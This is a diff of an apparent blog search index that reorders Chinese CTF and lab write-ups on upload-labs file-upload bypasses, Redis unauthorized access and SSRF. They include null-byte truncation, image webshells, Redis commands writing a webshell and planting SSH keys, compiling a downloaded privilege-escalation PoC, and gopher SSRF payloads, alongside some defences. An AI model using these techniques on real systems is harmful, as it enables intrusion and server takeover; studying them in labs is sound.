@@ -1,27 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>upload-labs12~17</title>
-    <url>/2020/12/23/2/</url>
-    <content><![CDATA[<h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><h4 id="白名单和黑名单"><a href="#白名单和黑名单" class="headerlink" title="白名单和黑名单"></a>白名单和黑名单</h4><p><strong>白名单：设置能通过的，白名单以外的不能通过。<br>黑名单:  不能通过，除黑名单以外可以通过。</strong></p>
-<span id="more"></span>
-
-<p>使用白名单，只允许jpg,png,gif，pass路径可控就很好处理了。<br>理解原理：$_GET[‘save_path’]函数是文件最终存储路径。代码里面拼接了一些随机字符，我们可以上传1.jpg，而在 save_path这个最终保存路径函数下面保存为1.php并加上%00来隔断后面的随机字符，这样实际存储到服务器上面路径上就是1.php的后缀了。<br>这里利用的是00截断。即move_uploaded_file函数的底层实现类似于C语言，遇到’\0’会截断。<br>在url中%00等价于ascii码中的0，表示字符串结束，读取结束。<br>截断条件：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、php版本小于5.3.4</span><br><span class="line">2、php.ini的magic_quotes_gpc为OFF状态</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/12/23/2/10.png"><br>上传白名单类型文件，抓包，在路径上添加ant.php%00<br><img src="/2020/12/23/2/11.png"><br>页面出错<br><img src="/2020/12/23/2/12.png"><br>把特殊符号删掉即可连接。<br><img src="/2020/12/23/2/13.png"><br>文件早已成功上传。也可以直接访问ant.php连接。</p>
-<p><img src="/2020/12/23/2/10.png"><br>上传白名单类型文件，抓包，在路径上添加ant.php%00<br><img src="/2020/12/23/2/11.png"><br>页面出错<br><img src="/2020/12/23/2/12.png"><br>把特殊符号删掉即可连接。<br><img src="/2020/12/23/2/13.png"><br>文件早已成功上传。也可以直接访问ant.php连接。</p>
-<h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>请求方式为POST，这里需要将%00url解码，post不像get可以自己解码。<br><img src="/2020/12/23/2/13.5.png"><br><img src="/2020/12/23/2/14.png">，成功上传。</p>
-<h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><p>gif头文件绕过，在一句话木马加GIF89a<br><img src="/2020/12/23/2/15.png">成功上传。<br><strong>制作图片木马</strong><br>先找到一个图片和制作一句话木马(这里可以以txt格式,php格式的文件都可以,我就用php的。)<br><img src="/2020/12/23/2/16.png"><br>因为这里的图片放在桌面，我们要在桌面的位置打开cmd进行操作。<br><img src="/2020/12/23/2/17.png"><br>使用copy命令制作，a表示ascii码文件，b表示二进制文件。<br><img src="/2020/12/23/2/18.png"><br><strong>如果php文件在前，jpg图片内容会复制在其后面，会出错。<br>如果jpg在前面，php一句话木马会复制在jpg内容后面，图片内容不会出错。<br>如果两者交换文件类型图片都无法正常显示。</strong><br>制作成功：<br><img src="/2020/12/23/2/19.png">无法显示。<br>这里不能直接连接图片获得websell，需要解析图片，我们通过文件包含漏洞解析。<br>建议看一下：<a href="https://www.jianshu.com/p/3514f0fd79f7">https://www.jianshu.com/p/3514f0fd79f7</a><br>在upload目录下新建一个php文件写下：<br><code>&lt;?php  $file=$_GET[&#39;page&#39;]; include($file); ?&gt;</code><br>添加include.php这个访问路径，把图片解析成一句话木马。<br><img src="/2020/12/23/2/20.png">连接成功。<br><img src="/2020/12/23/2/21.png">    </p>
-<h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><p>提示：本pass使用getimagesize()检查是否为图片文件！<br>了解函数:用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。<br>这里特别的是它会检查图片内容，所以在copy图片马的时候，不能破坏图片内容，<br><code>copy 1.jpg/b + 2.php/a 666.jpg</code><br><img src="/2020/12/23/2/22.png">制作后，图片还是可以正常显示，用记事本打开内容，一句话木马在最末尾。<br>a表示以ascii写入，b表示二进制。<br><img src="/2020/12/23/2/23.png"></p>
-<h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>这里需要开启php_exif模块，新版的phpstudy没有那个插件，我就下回旧版的，上传图片马即可，十四至十六差不多，只是用了不同的函数检查，<br>都通过文件包含漏洞将图片解析，不同图片类型上传方式也是一样。</p>
-<h3 id="Pass-17-二次渲染"><a href="#Pass-17-二次渲染" class="headerlink" title="Pass-17(二次渲染)"></a>Pass-17(二次渲染)</h3><p>二次渲染:根据用户上传的图片，生成新的图片加入数据库，把原上传的图片删除。<br>先从gif类型图片马上传，上传成功，但是中国蚁剑连接失败，查看一下上传后图片的内容，一句话木马不见了，被二次渲染了。<br><img src="/2020/12/23/2/24.png">原图片的一句话木马是在末尾的，前面我们也有查看过。<br>先下载一个十六制编辑器windex，找到两个图片哪一个位置没有变化，把php代码写进去即可。<br><img src="/2020/12/23/2/25.png">可以连接成功，代码被执行了。<br>还有两种类型，都需要写脚本，相对比较复杂，这里就借鉴大佬的了：<a href="https://xz.aliyun.com/t/2657#toc-13">https://xz.aliyun.com/t/2657#toc-13</a></p>
-]]></content>
-      <tags>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>upload-labs1~11</title>
     <url>/2020/12/20/1/</url>
     <content><![CDATA[<p>webshell：以网页文件形式存在的一种命令执行环境（是一种网页后门），即网页木马文件。</p>
@@ -44,6 +23,27 @@
 <p>在Apache的解析顺序中，是从右到左解析，如果最右侧的扩展名不可识别，就继续往左判断，直到可解析为止</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果上传文件名为1.php.xxxx</span><br><span class="line">因为后缀xxxx无法解析，所以只能解析1.php</span><br></pre></td></tr></table></figure>
 
+]]></content>
+      <tags>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>upload-labs12~17</title>
+    <url>/2020/12/23/2/</url>
+    <content><![CDATA[<h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><h4 id="白名单和黑名单"><a href="#白名单和黑名单" class="headerlink" title="白名单和黑名单"></a>白名单和黑名单</h4><p><strong>白名单：设置能通过的，白名单以外的不能通过。<br>黑名单:  不能通过，除黑名单以外可以通过。</strong></p>
+<span id="more"></span>
+
+<p>使用白名单，只允许jpg,png,gif，pass路径可控就很好处理了。<br>理解原理：$_GET[‘save_path’]函数是文件最终存储路径。代码里面拼接了一些随机字符，我们可以上传1.jpg，而在 save_path这个最终保存路径函数下面保存为1.php并加上%00来隔断后面的随机字符，这样实际存储到服务器上面路径上就是1.php的后缀了。<br>这里利用的是00截断。即move_uploaded_file函数的底层实现类似于C语言，遇到’\0’会截断。<br>在url中%00等价于ascii码中的0，表示字符串结束，读取结束。<br>截断条件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、php版本小于5.3.4</span><br><span class="line">2、php.ini的magic_quotes_gpc为OFF状态</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/23/2/10.png"><br>上传白名单类型文件，抓包，在路径上添加ant.php%00<br><img src="/2020/12/23/2/11.png"><br>页面出错<br><img src="/2020/12/23/2/12.png"><br>把特殊符号删掉即可连接。<br><img src="/2020/12/23/2/13.png"><br>文件早已成功上传。也可以直接访问ant.php连接。</p>
+<p><img src="/2020/12/23/2/10.png"><br>上传白名单类型文件，抓包，在路径上添加ant.php%00<br><img src="/2020/12/23/2/11.png"><br>页面出错<br><img src="/2020/12/23/2/12.png"><br>把特殊符号删掉即可连接。<br><img src="/2020/12/23/2/13.png"><br>文件早已成功上传。也可以直接访问ant.php连接。</p>
+<h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>请求方式为POST，这里需要将%00url解码，post不像get可以自己解码。<br><img src="/2020/12/23/2/13.5.png"><br><img src="/2020/12/23/2/14.png">，成功上传。</p>
+<h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><p>gif头文件绕过，在一句话木马加GIF89a<br><img src="/2020/12/23/2/15.png">成功上传。<br><strong>制作图片木马</strong><br>先找到一个图片和制作一句话木马(这里可以以txt格式,php格式的文件都可以,我就用php的。)<br><img src="/2020/12/23/2/16.png"><br>因为这里的图片放在桌面，我们要在桌面的位置打开cmd进行操作。<br><img src="/2020/12/23/2/17.png"><br>使用copy命令制作，a表示ascii码文件，b表示二进制文件。<br><img src="/2020/12/23/2/18.png"><br><strong>如果php文件在前，jpg图片内容会复制在其后面，会出错。<br>如果jpg在前面，php一句话木马会复制在jpg内容后面，图片内容不会出错。<br>如果两者交换文件类型图片都无法正常显示。</strong><br>制作成功：<br><img src="/2020/12/23/2/19.png">无法显示。<br>这里不能直接连接图片获得websell，需要解析图片，我们通过文件包含漏洞解析。<br>建议看一下：<a href="https://www.jianshu.com/p/3514f0fd79f7">https://www.jianshu.com/p/3514f0fd79f7</a><br>在upload目录下新建一个php文件写下：<br><code>&lt;?php  $file=$_GET[&#39;page&#39;]; include($file); ?&gt;</code><br>添加include.php这个访问路径，把图片解析成一句话木马。<br><img src="/2020/12/23/2/20.png">连接成功。<br><img src="/2020/12/23/2/21.png">    </p>
+<h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><p>提示：本pass使用getimagesize()检查是否为图片文件！<br>了解函数:用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。<br>这里特别的是它会检查图片内容，所以在copy图片马的时候，不能破坏图片内容，<br><code>copy 1.jpg/b + 2.php/a 666.jpg</code><br><img src="/2020/12/23/2/22.png">制作后，图片还是可以正常显示，用记事本打开内容，一句话木马在最末尾。<br>a表示以ascii写入，b表示二进制。<br><img src="/2020/12/23/2/23.png"></p>
+<h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>这里需要开启php_exif模块，新版的phpstudy没有那个插件，我就下回旧版的，上传图片马即可，十四至十六差不多，只是用了不同的函数检查，<br>都通过文件包含漏洞将图片解析，不同图片类型上传方式也是一样。</p>
+<h3 id="Pass-17-二次渲染"><a href="#Pass-17-二次渲染" class="headerlink" title="Pass-17(二次渲染)"></a>Pass-17(二次渲染)</h3><p>二次渲染:根据用户上传的图片，生成新的图片加入数据库，把原上传的图片删除。<br>先从gif类型图片马上传，上传成功，但是中国蚁剑连接失败，查看一下上传后图片的内容，一句话木马不见了，被二次渲染了。<br><img src="/2020/12/23/2/24.png">原图片的一句话木马是在末尾的，前面我们也有查看过。<br>先下载一个十六制编辑器windex，找到两个图片哪一个位置没有变化，把php代码写进去即可。<br><img src="/2020/12/23/2/25.png">可以连接成功，代码被执行了。<br>还有两种类型，都需要写脚本，相对比较复杂，这里就借鉴大佬的了：<a href="https://xz.aliyun.com/t/2657#toc-13">https://xz.aliyun.com/t/2657#toc-13</a></p>
 ]]></content>
       <tags>
         <tag>文件上传</tag>
@@ -165,194 +165,6 @@
 <ul>
 <li>flag被注释的时候，执行命令查看flag时，可用type flag。</li>
 </ul>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF-Redis未授权访问漏洞利用与防御</title>
-    <url>/2021/05/27/CTF-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
-    <content><![CDATA[<h3 id="Redis未授权访问漏洞利用与防御"><a href="#Redis未授权访问漏洞利用与防御" class="headerlink" title="Redis未授权访问漏洞利用与防御"></a>Redis未授权访问漏洞利用与防御</h3><h4 id="Redis漏洞"><a href="#Redis漏洞" class="headerlink" title="Redis漏洞"></a>Redis漏洞</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Redis配置不当可导致未授权访问，被恶意利用。部分服务器上的Redis绑定在0.0.0.0：6379,并且没有开启认证(这是Redis的默认配置)，以及该端口可通过公网直接访问，如果没有采取相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等，将会导致Redis服务器直接暴露在公网上，可能造成其他用户直接在非授权情况下直接访问呢Redis服务并进行相关操作。</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-
-
-<h4 id="Redis服务实验环境搭建"><a href="#Redis服务实验环境搭建" class="headerlink" title="Redis服务实验环境搭建"></a>Redis服务实验环境搭建</h4><p>kali linux下环境搭建：</p>
-<p>1、Redis安装包下载与安装</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-3.2.0.tar.gz</span><br><span class="line">tar xzf redis-3.2.0</span><br><span class="line">cd redis-3.2.0</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
-
-
-
-<p>2、配置Redis</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim redis.conf</span><br><span class="line">1、bind 127.0.0.1 前面加上#</span><br><span class="line">2、protected-mode设为no</span><br></pre></td></tr></table></figure>
-
-
-
-<p>3、加载配置文件启动Redis服务</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd src</span><br><span class="line">redis-server ../redis-conf</span><br></pre></td></tr></table></figure>
-
-
-
-<p>4、查看6379端口是否启动</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p 6379 --script redis-info +redis服务器ip地址</span><br></pre></td></tr></table></figure>
-
-
-
-<p>通过连接redis服务，执行info命令，探测出当前redis存在未授权访问漏洞</p>
-<p>Redis客户端连接服务端</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h +redis服务器ip地址</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="Redis未授权漏洞利用"><a href="#Redis未授权漏洞利用" class="headerlink" title="Redis未授权漏洞利用"></a>Redis未授权漏洞利用</h4><p>利用漏洞 写入webshell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/www/html</span><br><span class="line">set x &quot;\n\n\n&lt;?php phpinfo();?&gt;\n\n\n&quot;</span><br><span class="line">config set dbfilename webshell.php </span><br><span class="line">save\\保存文件</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由可写webshell到指定路径，就可以写其他具有权限的文件，如计划任务，ssh密钥文件。</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h4 id="Redis漏洞防御"><a href="#Redis漏洞防御" class="headerlink" title="Redis漏洞防御"></a>Redis漏洞防御</h4><p>1、增加密码认证</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#requirepass foobared</span><br><span class="line">requirepass +密码</span><br></pre></td></tr></table></figure>
-
-
-
-<p>2、绑定内网ip地址</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<h4 id="Redis未授权添加ssh密钥"><a href="#Redis未授权添加ssh密钥" class="headerlink" title="Redis未授权添加ssh密钥"></a>Redis未授权添加ssh密钥</h4><p>1、nmap探测目标是否存在redis服务(6379)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 端口 ip</span><br></pre></td></tr></table></figure>
-
-
-
-<p>2、测试redis服务是否存在未授权访问</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 服务端地址</span><br><span class="line">info</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>3、ssh密钥生成</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">cd ~/.ssh/</span><br><span class="line">(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt;public.txt</span><br><span class="line">两个换行</span><br></pre></td></tr></table></figure>
-
-
-
-<p>4、 上传密钥</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat public.txt |redis-cli -h ip -x set x //将文件内容读取到变量x，通过-x执行相关命令，相当于set x=public.txt文件内容</span><br><span class="line"></span><br><span class="line">redis-cli -h ip config set dir &quot;/home/user/.ssh/&quot; user需要破解，可尝试直接访问/~/.ssh/</span><br><span class="line"></span><br><span class="line">redis-cli -h ip config set dbfilename authorized_keys</span><br><span class="line"></span><br><span class="line">redis-cli -h ip save </span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -l user -i id_rsa ip</span><br><span class="line">连接失败</span><br><span class="line">扫描22端口</span><br><span class="line">nmap -p 22 ip</span><br><span class="line">22端口关闭</span><br><span class="line">扫描所有端口</span><br><span class="line">namp -p 1-65535 -T4 -n -v ip</span><br><span class="line"></span><br><span class="line">发现一个novation服务也是ssh服务标识</span><br><span class="line"></span><br><span class="line">ssh -l user -p 1322 -i</span><br><span class="line">用户名还是需要爆破的，后面连接需要用到。</span><br><span class="line">不具有最高权限</span><br></pre></td></tr></table></figure>
-
-
-
-<p>5、提权</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -a </span><br><span class="line">查看版本相关信息</span><br><span class="line">百度搜索相关漏洞</span><br><span class="line">https://www.exploit-db.com/</span><br><span class="line"></span><br><span class="line">mkdir tmp</span><br><span class="line">cd tmp</span><br><span class="line">wget ... poc.c 下载相关漏洞</span><br><span class="line">gcc poc.c </span><br><span class="line">然后执行新生成的文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF-SSRF</title>
-    <url>/2021/05/25/CTF-SSRF/</url>
-    <content><![CDATA[<h1 id="CTF-SSRF"><a href="#CTF-SSRF" class="headerlink" title="CTF-SSRF"></a>CTF-SSRF</h1><h3 id="SSRF介绍与简单介绍"><a href="#SSRF介绍与简单介绍" class="headerlink" title="SSRF介绍与简单介绍"></a>SSRF介绍与简单介绍</h3><p>原理：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器请求伪造是一种由web服务器发出请求的漏洞，它能够请求到与它相连的内网资源。因此SSRF主要测试目标是企业的内网系统。</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">很多web应用提供从其他服务器获取数据的功能，可根据用户提交URL访问对应资源(获取图片，下载文件，读取内容等)。</span><br><span class="line">如果该功能作为代理通道去访问本地或远程服务器，这就是所谓的SSRF。</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h4 id="SSRF可能造成的危害"><a href="#SSRF可能造成的危害" class="headerlink" title="SSRF可能造成的危害"></a>SSRF可能造成的危害</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、对内网进行信息探测-端口扫描</span><br><span class="line">2、对内网服务区进行漏洞扫描利用</span><br><span class="line">3、对内网web的应用进行安全测试，如Structs、Sql注入漏洞利用。</span><br><span class="line">4、对内网中的文件读取(file协议)</span><br><span class="line">5、在PHP环境中，如果搭建expect扩展，可能被命令执行。</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h4 id="SSRF-漏洞-常用函数"><a href="#SSRF-漏洞-常用函数" class="headerlink" title="SSRF 漏洞 常用函数"></a>SSRF 漏洞 常用函数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、file_get_contents</span><br><span class="line">PHP 4 &gt;= 4.3.0, PHP 5, PHP 7, PHP 8)</span><br><span class="line">-将整个文件读入一个字符串。</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2、fsockopen函数</span><br><span class="line">(PHP 4, PHP 5, PHP 7, PHP 8)</span><br><span class="line">-打开一个网络连接或者一个Unix套接字连接</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl函数</span><br><span class="line">参考文档：https://www.php.net/manual/zh/book.curl.php</span><br><span class="line">PHP支持Daniel Stenberg创建的libcurl库，能够连接通讯各种服务器、使用各种协议。libcurl目前支持的协议有http、https、ftp、gopher、telnet、dict、file、ldap。libcurl同时支持HTTPS证书，HTTP POST、HTTP PUT、FTP上传(也能通过PHP的FTP扩展完成)、HTTP基于表单上传、代理、cookies、用户名+密码的认证。</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="SSRF绕过限制姿势"><a href="#SSRF绕过限制姿势" class="headerlink" title="SSRF绕过限制姿势"></a>SSRF绕过限制姿势</h3><h4 id="1、添加端口"><a href="#1、添加端口" class="headerlink" title="1、添加端口"></a>1、添加端口</h4><p>HTTP请求URL中默认以80端口。</p>
-<h4 id="2、短网址"><a href="#2、短网址" class="headerlink" title="2、短网址"></a>2、短网址</h4><p><a href="https://sina.lt/">https://sina.lt/</a></p>
-<h4 id="3、指定任意IP的域名xip-io"><a href="#3、指定任意IP的域名xip-io" class="headerlink" title="3、指定任意IP的域名xip.io"></a>3、指定任意IP的域名xip.io</h4><p><a href="https://xip.io/">https://xip.io/</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1.xip.io</span><br><span class="line">www.127.0.0.1.xip.io</span><br><span class="line">mysite.127.0.0.1.xip.io</span><br><span class="line">foo.bar.127.0.0.1.xip.io</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="4、数制绕过"><a href="#4、数制绕过" class="headerlink" title="4、数制绕过"></a>4、数制绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IP地址是32位二进制数-&gt;4个字节</span><br><span class="line">目前看到的IP地址都是采用点分十进制组成的。</span><br><span class="line">127.0.0.1 -&gt;  01111111.00000000.00000000.00000001</span><br><span class="line">转化为十进制 -&gt; 2130706433</span><br><span class="line">八进制-&gt; 0177.00.00.01</span><br><span class="line">十六进制 -&gt; 0x7f.0x0.0x0.0x1</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="5、-跳转"><a href="#5、-跳转" class="headerlink" title="5、@跳转"></a>5、@跳转</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在URL中使用@可跳转到指定的URL</span><br><span class="line">http://www.baidu.com@127.0.0.1</span><br><span class="line">变成http://127.0.0.1</span><br><span class="line">https://www.baidu.com@127.0.0.1</span><br><span class="line">变成https://127.0.0.1</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="SSRF可用协议"><a href="#SSRF可用协议" class="headerlink" title="SSRF可用协议"></a>SSRF可用协议</h3><h4 id="1、file协议"><a href="#1、file协议" class="headerlink" title="1、file协议"></a>1、file协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file：//文件路径</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="2、dict协议"><a href="#2、dict协议" class="headerlink" title="2、dict协议"></a>2、dict协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用dict协议可探测端口的开放情况和指纹信息</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令格式：</span><br><span class="line">dict://serverip:port/info</span><br><span class="line">dict://127.0.0.1:80/info</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="3、gopher协议"><a href="#3、gopher协议" class="headerlink" title="3、gopher协议"></a>3、gopher协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gopher是internet上非常有名的信息查找系统，它将internet的文件组织成某种索引，很方便从internet的一处带到另一处。在www出现之前，Gopher是internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但是www出现之后，Gopher地位受到打击。Gopher协议在SSRF可以是一个万能协议，可进行GET、POST请求发送。</span><br></pre></td></tr></table></figure>
-
-
-
-<p>构造Gopher数据：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">抓包后将整个数据包的</span><br><span class="line">空格替换成%20</span><br><span class="line">问好替换成%3f</span><br><span class="line">回车换行替换成%0d%0a</span><br><span class="line">最后一行也需要%0d%0a</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>gopher GET请求</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl gopher://ip:端口/_数据</span><br><span class="line"></span><br><span class="line">如</span><br><span class="line">curl gopher://127.0.0.1:端口/_GET%20/..../?a=...%20HTTP/1.1%0d%0aHost:127.0.0.1%0d%0a</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p><strong>gopher POST请求</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">与get请求类似，但是需要传入更多的相关信息。</span><br><span class="line">必须有</span><br><span class="line"></span><br><span class="line">POST /.../ HTTP/1.1</span><br><span class="line">Host: xxx</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length:9</span><br><span class="line"></span><br><span class="line">a=xxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">最终变成</span><br><span class="line">curl gopher://_POST%20/.../%20HTTP/1.1%0d%0aHost:%20xxx%0d0aContent-Type:%20application/x-www-form-urlencoded%0d0aContent-Length%209%0d0a%0d0aa=xxx%0d%0a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">特别注意 POST有两个换号位置。</span><br><span class="line">%0d%0a%0d%0a</span><br></pre></td></tr></table></figure>
-
-
-
 ]]></content>
       <tags>
         <tag>CTF</tag>
@@ -484,6 +296,103 @@
 
 <p>设置唯一键</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table admin add unique (username)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTF-Redis未授权访问漏洞利用与防御</title>
+    <url>/2021/05/27/CTF-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
+    <content><![CDATA[<h3 id="Redis未授权访问漏洞利用与防御"><a href="#Redis未授权访问漏洞利用与防御" class="headerlink" title="Redis未授权访问漏洞利用与防御"></a>Redis未授权访问漏洞利用与防御</h3><h4 id="Redis漏洞"><a href="#Redis漏洞" class="headerlink" title="Redis漏洞"></a>Redis漏洞</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Redis配置不当可导致未授权访问，被恶意利用。部分服务器上的Redis绑定在0.0.0.0：6379,并且没有开启认证(这是Redis的默认配置)，以及该端口可通过公网直接访问，如果没有采取相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等，将会导致Redis服务器直接暴露在公网上，可能造成其他用户直接在非授权情况下直接访问呢Redis服务并进行相关操作。</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+
+
+<h4 id="Redis服务实验环境搭建"><a href="#Redis服务实验环境搭建" class="headerlink" title="Redis服务实验环境搭建"></a>Redis服务实验环境搭建</h4><p>kali linux下环境搭建：</p>
+<p>1、Redis安装包下载与安装</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-3.2.0.tar.gz</span><br><span class="line">tar xzf redis-3.2.0</span><br><span class="line">cd redis-3.2.0</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2、配置Redis</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim redis.conf</span><br><span class="line">1、bind 127.0.0.1 前面加上#</span><br><span class="line">2、protected-mode设为no</span><br></pre></td></tr></table></figure>
+
+
+
+<p>3、加载配置文件启动Redis服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd src</span><br><span class="line">redis-server ../redis-conf</span><br></pre></td></tr></table></figure>
+
+
+
+<p>4、查看6379端口是否启动</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p 6379 --script redis-info +redis服务器ip地址</span><br></pre></td></tr></table></figure>
+
+
+
+<p>通过连接redis服务，执行info命令，探测出当前redis存在未授权访问漏洞</p>
+<p>Redis客户端连接服务端</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h +redis服务器ip地址</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Redis未授权漏洞利用"><a href="#Redis未授权漏洞利用" class="headerlink" title="Redis未授权漏洞利用"></a>Redis未授权漏洞利用</h4><p>利用漏洞 写入webshell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/www/html</span><br><span class="line">set x &quot;\n\n\n&lt;?php phpinfo();?&gt;\n\n\n&quot;</span><br><span class="line">config set dbfilename webshell.php </span><br><span class="line">save\\保存文件</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由可写webshell到指定路径，就可以写其他具有权限的文件，如计划任务，ssh密钥文件。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="Redis漏洞防御"><a href="#Redis漏洞防御" class="headerlink" title="Redis漏洞防御"></a>Redis漏洞防御</h4><p>1、增加密码认证</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#requirepass foobared</span><br><span class="line">requirepass +密码</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2、绑定内网ip地址</p>
